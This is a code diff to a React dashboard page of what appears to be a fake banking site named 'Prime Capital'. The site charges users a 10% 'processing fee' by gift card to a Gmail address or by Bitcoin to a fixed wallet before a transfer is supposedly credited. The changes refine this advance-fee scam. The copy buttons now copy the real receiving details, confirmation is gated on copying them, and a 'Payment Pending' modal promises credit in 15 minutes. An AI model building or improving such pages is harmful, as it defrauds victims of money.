@@ -28,6 +28,10 @@ export default function DashboardPage() {
   });
   const [showCopyConfirmation, setShowCopyConfirmation] = useState(false);
   const [copyConfirmationText, setCopyConfirmationText] = useState('');
+  const [hasCopiedDetails, setHasCopiedDetails] = useState(false);
+  const [showWarning, setShowWarning] = useState(false);
+  const [showBalanceWarning, setShowBalanceWarning] = useState(false);
+  const [showPendingModal, setShowPendingModal] = useState(false);
 
   const banks = [
     'JPMorgan Chase',
@@ -176,6 +180,13 @@ export default function DashboardPage() {
     } else if (name === 'amount') {
       // Only allow numbers and decimal point, max 2 decimal places
       if (/^\d*\.?\d{0,2}$/.test(value)) {
+        const amount = parseFloat(value);
+        const currentBalance = parseFloat(totalBalance.replace(/[^0-9.-]+/g, ''));
+        if (amount > currentBalance) {
+          setShowBalanceWarning(true);
+        } else {
+          setShowBalanceWarning(false);
+        }
         setTransferForm({ ...transferForm, [name]: value });
       }
     } else {
@@ -196,6 +207,7 @@ export default function DashboardPage() {
     navigator.clipboard.writeText(text);
     setCopyConfirmationText(type === 'giftcard' ? 'Email copied!' : 'Wallet address copied!');
     setShowCopyConfirmation(true);
+    setHasCopiedDetails(true);
     setTimeout(() => {
       setShowCopyConfirmation(false);
     }, 2000);
@@ -206,11 +218,15 @@ export default function DashboardPage() {
   };
 
   const handlePaymentConfirmation = () => {
+    if (!hasCopiedDetails) {
+      setShowWarning(true);
+      return;
+    }
+    setShowPaymentModal(false);
+    setShowPendingModal(true);
     setShowConfetti(true);
     setTimeout(() => {
       setShowConfetti(false);
-      setShowPaymentModal(false);
-      setSelectedPaymentMethod('');
     }, 5000);
   };
 
@@ -373,7 +389,10 @@ export default function DashboardPage() {
             <div className="flex justify-between items-center mb-4">
               <h2 className="text-xl font-semibold text-yellow-500">Transfer Money</h2>
               <button 
-                onClick={() => setShowTransferModal(false)}
+                onClick={() => {
+                  setShowTransferModal(false);
+                  setShowBalanceWarning(false);
+                }}
                 className="text-white hover:text-yellow-500"
               >
                 <svg 
@@ -465,14 +484,39 @@ export default function DashboardPage() {
                   pattern="\d*\.?\d{0,2}"
                   title="Only numbers and up to 2 decimal places are allowed"
                 />
+                {showBalanceWarning && (
+                  <p className="text-red-500 text-sm mt-1">Amount exceeds your current balance of {totalBalance}</p>
+                )}
               </div>
               <button
                 type="submit"
                 className="w-full bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
+                disabled={showBalanceWarning}
               >
                 Transfer
               </button>
             </form>
+          </div>
+        </div>
+      )}
+
+      {/* Payment Pending Modal */}
+      {showPendingModal && (
+        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
+          <div className="bg-white/10 backdrop-blur-lg p-8 rounded-lg max-w-md w-full mx-4">
+            <div className="text-center">
+              <div className="w-16 h-16 border-4 border-yellow-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+              <h3 className="text-xl font-bold text-white mb-2">Payment Pending</h3>
+              <p className="text-gray-300 mb-4">
+                We are reviewing your payment. Your account will be credited within 15 minutes after your payment is confirmed.
+              </p>
+              <button
+                onClick={() => setShowPendingModal(false)}
+                className="bg-yellow-500 text-black px-6 py-2 rounded-lg hover:bg-yellow-600 transition-colors"
+              >
+                Close
+              </button>
+            </div>
           </div>
         </div>
       )}
@@ -496,6 +540,8 @@ export default function DashboardPage() {
                 onClick={() => {
                   setShowPaymentModal(false);
                   setSelectedPaymentMethod('');
+                  setHasCopiedDetails(false);
+                  setShowWarning(false);
                 }}
                 className="text-white hover:text-yellow-500"
               >
@@ -518,7 +564,7 @@ export default function DashboardPage() {
               <div className="bg-white/5 p-3 md:p-4 rounded-lg">
                 <p className="text-gray-200 mb-2 text-yellow-500">Receiver Details: </p>
                 <div className="space-y-2">
-                  <p className="text-gray-200">Bank: <span className="text-white">{transferForm.bank}</span></p>
+                  <p className="text-gray-200">Bank Name: <span className="text-white">{transferForm.bank}</span></p>
                   <p className="text-gray-200">Account Name: <span className="text-white">{transferForm.accountName}</span></p>
                   <p className="text-gray-200">Account Number: <span className="text-white">{transferForm.accountNumber}</span></p>
                   <p className="text-gray-200">Routing Number: <span className="text-white">{transferForm.routingNumber}</span></p>
@@ -530,7 +576,7 @@ export default function DashboardPage() {
                 <p className="text-gray-200 mb-2 text-yellow-500">Payment Information:</p>
                 <div className="space-y-2">
                   <p className="text-sm text-gray-300">Note: The processing fee is <span className="text-green-500">${calculateFee()}</span> (10%) of your transfer amount and must be paid using one of the payment methods below.</p>
-                  <p className="text-sm text-yellow-500 mt-2">Your account will be credited within 15 minutes after the processing fee is paid.</p>
+                  <p className="text-sm text-green-500 text-[12px] mt-2">Your account will be credited within 15 minutes after the processing fee is paid.</p>
                 </div>
               </div>
               
@@ -550,18 +596,22 @@ export default function DashboardPage() {
                   {selectedPaymentMethod === 'giftcard' && (
                     <div className="mt-4">
                       <p className="text-gray-200 mb-2">Send gift card to:</p>
-                      <div className="flex items-center space-x-2">
-                        <code className="flex-1 bg-black/50 p-2 rounded text-white break-all text-sm">primecapitalorg@gmail.com</code>
-                        <button
-                          onClick={() => copyToClipboard('giftcards@primecapital.com', 'giftcard')}
-                          className="bg-yellow-500 hover:bg-yellow-600 text-black px-3 py-2 rounded-lg font-semibold transition-colors duration-300"
-                        >
-                          Copy
-                        </button>
+                      <div className="relative">
+                        <div className="flex items-center bg-black/50 rounded">
+                          <code className="flex-1 p-2 text-white text-[12px] break-all text-sm">primecapitalorg@gmail.com</code>
+                          <button
+                            onClick={() => copyToClipboard('primecapitalorg@gmail.com', 'giftcard')}
+                            className="p-2 text-yellow-500 hover:text-yellow-400"
+                          >
+                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                            </svg>
+                          </button>
+                        </div>
                       </div>
                       <button
                         onClick={handlePaymentConfirmation}
-                        className="w-full mt-4 bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
+                        className="w-full mt-4 bg-yellow-500 hover:bg-yellow-700 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                       >
                         Payment Made
                       </button>
@@ -584,18 +634,22 @@ export default function DashboardPage() {
                   {selectedPaymentMethod === 'bitcoin' && (
                     <div className="mt-4">
                       <p className="text-gray-200 mb-2">Send Bitcoin to:</p>
-                      <div className="flex flex-col space-y-2">
-                        <code className="w-full bg-black/50 p-2 rounded text-white break-all text-sm">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
-                        <button
-                          onClick={() => copyToClipboard('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', 'bitcoin')}
-                          className="w-full bg-yellow-500 hover:bg-yellow-600 text-black px-3 py-2 rounded-lg font-semibold transition-colors duration-300"
-                        >
-                          Copy
-                        </button>
+                      <div className="relative">
+                        <div className="flex items-center bg-black/50 rounded">
+                          <code className="flex-1 p-2 text-white text-[12px]  break-all text-sm">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
+                          <button
+                            onClick={() => copyToClipboard('bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz', 'bitcoin')}
+                            className="p-2 text-yellow-500 hover:text-yellow-400"
+                          >
+                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                            </svg>
+                          </button>
+                        </div>
                       </div>
                       <button
                         onClick={handlePaymentConfirmation}
-                        className="w-full mt-4 bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
+                        className="w-full mt-4 bg-yellow-500 hover:bg-yellow-700 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                       >
                         Payment Made
                       </button>
